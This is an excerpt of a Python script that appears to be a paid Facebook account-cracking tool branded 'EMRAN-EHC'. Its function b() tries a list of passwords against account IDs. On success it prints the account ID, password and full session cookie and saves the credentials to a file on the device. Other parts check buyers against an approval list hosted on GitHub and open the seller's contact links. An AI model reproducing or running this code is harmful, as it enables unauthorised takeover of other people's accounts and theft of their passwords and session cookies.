...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+9170569549857');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://t.me/ehcehcemran0011223311cyber99');time.sleep(1)
		admin()
	if bal =='3':
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mEMRAN-EHC-👿\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [EMRAN-EHC-OK🔥] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💉]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/EMRAN-EHC-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/EMRAN-EHC/Paid/blob/main/Approval.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        os.system("xdg-open https://www.facebook.com/Alex.Emran.500?mibextid=ZbWKwL")
        time.sleep(3.0)
